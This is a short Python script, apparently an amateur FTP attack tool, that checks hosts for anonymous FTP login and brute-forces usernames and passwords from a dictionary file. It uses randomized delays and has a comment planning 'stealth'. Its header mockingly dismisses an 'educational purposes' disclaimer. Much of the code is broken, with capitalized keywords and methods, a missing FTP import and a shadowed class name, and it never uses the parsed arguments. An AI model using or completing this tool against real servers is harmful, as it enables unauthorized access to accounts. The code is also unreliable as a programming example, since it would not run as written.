'''
EDUCATIONAL STUDY PURPOSES ONLY !!! bwhahahahahaha yea ok!!!
Reminder: add more functionality and features maybe stealth hmmmm
some bugs left on purpose i'll fix later
'''

import ftplib
import random
import time
import argparse
# def rando(self):
#     print(random.randint(0,9))

# print("hello")
# time.sleep(random.randint(0,9))
# print("world")

def a_scan (hostname):
    ftp = FTP("insert hostname here")
    try:
        with FTP (hostname) as FTP:
            ftp.login()
            print('\n[*] ' + str(hostname) + " FTP Anonymous login successful!")
            return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + " FTP Anonymous logon failure!")
        return False 



#Brute force login function 
Def forcelog(hostname, pwdlist): # parameters (hostname, dict file name)
    ftp = FTP("insert hostname here")
    try:
        with open (pwdlist, 'R') as pf: # open password list file
            for line in pf.Readlines(): # iterate through passwordfile
                #time.Sleep(1) # wait 1 second <<<<<SEE IF YOU CAN RANDOMIZE THIS
                time.Sleep(random.randint(0,9)) # applied radomizer to the sleep function
                userN = line.split(':')[0] # fetches the user name from the read content
                passW = line.split(':')[1]. strip('\r'). Strip ('\ n') # removes the password from the read content
                print('[+] Trying: ' + userN + ':' + passW)
                try:
                    with FTP(hostname) as FTP: # construct FTP object with hostname as parameter
                        ftp.login(userN, passW) # use creds to try to log into FTP server
                        #If no exception occurs, login successful print results for confirmation 
                        print('\n[+] ' + str(hostname) + ' FTP Login successful: '+ \
                              userN + ':' + passW)
                        return (userN, passW)
                except Exception as e:
                    #use exception if login fails 
                    pass
    except IOError as e:
        print('Error: the password file does not exist!')
        print('\n[-] Cannot crack the login try another dict file!')
    return (None,None)


#The argumentparser object is created here with the description
parser = argparse.ArgumentParser(description = 'FTP Scanner')
#Adding the - H command dest can be understood as obtaining the variable name of the value after the - h parameter when parsing. Help is the help information of this command
parser.add_argument('-H',dest='hostName',help='The host list with ","space')
parser.add_argument('-l',dest='pwdlist',help='Password dictionary file')
options = None
try:
    options = parser.parse_args()

except:
    print(parser.parse_args(['-h']))
    exit(0)
hostNames = str(options.hostName).split(',')
pwdlist = options.pwdlist
